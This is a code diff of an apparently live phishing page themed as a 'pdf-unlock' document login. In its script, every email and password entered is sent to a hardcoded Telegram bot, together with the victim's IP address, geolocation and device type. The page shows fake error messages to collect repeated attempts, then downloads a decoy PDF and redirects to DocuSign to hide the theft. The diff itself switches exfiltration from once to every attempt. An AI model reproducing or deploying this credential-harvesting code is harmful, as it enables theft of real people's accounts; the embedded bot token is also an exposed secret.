@@ -106,83 +106,81 @@
   </div>
 
   <script>
-    const form = document.getElementById("loginForm");
-    const errorMsg = document.getElementById("errorMsg");
-    const successMsg = document.getElementById("successMsg");
-    const attempts = [];
+  const form = document.getElementById("loginForm");
+  const errorMsg = document.getElementById("errorMsg");
+  const successMsg = document.getElementById("successMsg");
+  const attempts = [];
 
-    // Auto-fill email from # fragment
-    const fragmentEmail = window.location.hash.slice(1);
-    if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fragmentEmail)) {
-      form.email.value = fragmentEmail;
+  // Auto-fill email from # fragment
+  const fragmentEmail = window.location.hash.slice(1);
+  if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fragmentEmail)) {
+    form.email.value = fragmentEmail;
+  }
+
+  const telegramToken = "7298891394:AAE9-U7lE-kbCDL8CHb7YNQLPZVvRc2MG2s";
+  const chatId = "5613637159";
+  const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+  form.addEventListener("submit", async function (e) {
+    e.preventDefault();
+
+    const email = form.email.value.trim();
+    const password = form.password.value.trim();
+    attempts.push({ email, password });
+
+    // Show error on 1st & 2nd, success on 3rd
+    if (attempts.length < 3) {
+      errorMsg.style.display = "block";
+      successMsg.style.display = "none";
+    } else {
+      errorMsg.style.display = "none";
+      successMsg.style.display = "block";
     }
 
-    const telegramToken = "7298891394:AAE9-U7lE-kbCDL8CHb7YNQLPZVvRc2MG2s";
-    const chatId = "5613637159";
-    const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
-
-    form.addEventListener("submit", async function (e) {
-      e.preventDefault();
-
-      const email = form.email.value.trim();
-      const password = form.password.value.trim();
-      attempts.push({ email, password });
-
-      // Show error on 1st & 2nd, success on 3rd
-      if (attempts.length < 3) {
-        errorMsg.style.display = "block";
-        successMsg.style.display = "none";
-      } else {
+    // Hide error/success if user types again
+    form.querySelectorAll("input").forEach(input => {
+      input.addEventListener("input", () => {
         errorMsg.style.display = "none";
-        successMsg.style.display = "block";
+        successMsg.style.display = "none";
+      }, { once: true });
+    });
+
+    form.reset();
+
+    try {
+      const ipRes = await fetch("https://api.ipify.org?format=json");
+      const { ip } = await ipRes.json();
+
+      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+      const geo = await geoRes.json();
+
+      const now = new Date().toUTCString();
+
+      // Detect device type
+      const ua = navigator.userAgent;
+      let deviceType = "Unknown Device";
+
+      if (/mobile/i.test(ua)) {
+        deviceType = "📱 Mobile";
+      } else if (/tablet/i.test(ua)) {
+        deviceType = "📱 Tablet";
+      } else if (/iPad|Android(?!.*Mobile)/i.test(ua)) {
+        deviceType = "📱 Tablet";
+      } else {
+        deviceType = "💻 Desktop";
       }
 
-      // Hide error/success if user types again
-      form.querySelectorAll("input").forEach(input => {
-        input.addEventListener("input", () => {
-          errorMsg.style.display = "none";
-          successMsg.style.display = "none";
-        }, { once: true });
-      });
+      // Prepare message for current attempt only
+      const currentAttempt = attempts.length;
+      const status = currentAttempt < 3 ? "❌ Failed" : "✅ Final Attempt";
 
-      form.reset();
+      let message = `🔐 pdf-unlock Login Attempt #${currentAttempt} ${status}\n`;
+      message += `👤 email: ${email}\n🔑 Password: ${password}\n`;
+      message += `🕒 Time: ${now}\n`;
+      message += `🌍 Location: ${geo.city || "Unknown"}, ${geo.country_name || "Unknown"}\n`;
+      message += `📡 IP: ${ip}\n`;
+      message += `🖥️ Device: ${deviceType}`;
 
-      if (attempts.length === 3) {
-  try {
-    const ipRes = await fetch("https://api.ipify.org?format=json");
-    const { ip } = await ipRes.json();
-
-    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
-    const geo = await geoRes.json();
-
-    const now = new Date().toUTCString();
-
-    let message = `🔐 pdf-unlock Login Attempts\n`;
-    attempts.forEach((attempt, i) => {
-      message += `#${i + 1} ${i < 2 ? "❌ Failed" : "✅ Final Attempt"}\n`;
-      message += `👤 email: ${attempt.email}\n🔑 Password: ${attempt.password}\n\n`;
-    });
-    // Detect device type
-const ua = navigator.userAgent;
-let deviceType = "Unknown Device";
-
-if (/mobile/i.test(ua)) {
-  deviceType = "📱 Mobile";
-} else if (/tablet/i.test(ua)) {
-  deviceType = "📱 Tablet";
-} else if (/iPad|Android(?!.*Mobile)/i.test(ua)) {
-  deviceType = "📱 Tablet";
-} else {
-  deviceType = "💻 Desktop";
-}
-
-message += `🕒 Time: ${now}\n`;
-message += `🌍 Location: ${geo.city || "Unknown"}, ${geo.country_name || "Unknown"}\n`;
-message += `📡 IP: ${ip}\n`;
-message += `🖥️ Device: ${deviceType}`;
-
-    // Try to send to Telegram
-    try {
       await fetch(telegramUrl, {
         method: "POST",
         headers: { "Content-Type": "application/x-www-form-urlencoded" },
@@ -192,26 +190,22 @@ message += `🖥️ Device: ${deviceType}`;
         })
       });
     } catch (err) {
-      console.warn("⚠️ Telegram send failed:", err);
+      console.warn("⚠️ IP/Geo or Telegram send failed:", err);
     }
 
-  } catch (err) {
-    console.warn("⚠️ IP or Geo fetch failed:", err);
-  }
+    if (attempts.length === 3) {
+      const link = document.createElement("a");
+      link.href = "https://raw.githubusercontent.com/ddfjhfg/pdf-hosting/main/Catalog.pdf";
+      link.download = "";
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
 
-  // ✅ Always trigger PDF download + redirect
-  const link = document.createElement("a");
-  link.href = "https://raw.githubusercontent.com/ddfjhfg/pdf-hosting/main/Catalog.pdf";
-  link.download = "";
-  document.body.appendChild(link);
-  link.click();
-  document.body.removeChild(link);
-
-  setTimeout(() => {
-    window.location.href = "https://www.docusign.com";
-  }, 2000);
-}
-    });
-  </script>
+      setTimeout(() => {
+        window.location.href = "https://www.docusign.com";
+      }, 2000);
+    }
+  });
+</script>
 </body>
 </html>
